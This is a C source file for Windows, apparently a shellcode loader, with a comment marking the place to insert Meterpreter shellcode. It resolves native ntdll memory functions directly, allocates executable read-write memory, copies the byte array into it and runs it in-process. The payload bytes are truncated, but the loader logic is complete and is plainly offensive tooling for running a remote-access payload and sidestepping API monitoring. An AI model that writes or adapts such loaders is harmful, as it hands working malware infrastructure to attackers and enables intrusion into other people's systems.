#include <stdio.h>
#include <windows.h>
#include <winternl.h>

// Define the NtAllocateVirtualMemory function pointer
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

// Define the NtFreeVirtualMemory function pointer
typedef NTSTATUS(WINAPI* PNTFREEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

int main() {

    // Insert Meterpreter shellcode 
    unsigned char code[] = "\xa6\x12\xd9...";


    // Load the NtAllocateVirtualMemory function from ntdll.dll
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory =
        (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");


    // Allocate Virtual Memory  
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &exec,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );


    // Copy shellcode into allocated memory 
    RtlCopyMemory(exec, code, sizeof code);


    // Execute shellcode in memory  
    ((void(*)())exec)();


    // Free the allocated memory using NtFreeVirtualMemory
    PNTFREEVIRTUALMEMORY NtFreeVirtualMemory =
        (PNTFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");
    SIZE_T regionSize = 0;
    status = NtFreeVirtualMemory(GetCurrentProcess(), &exec, &regionSize, MEM_RELEASE);

    return 0;
}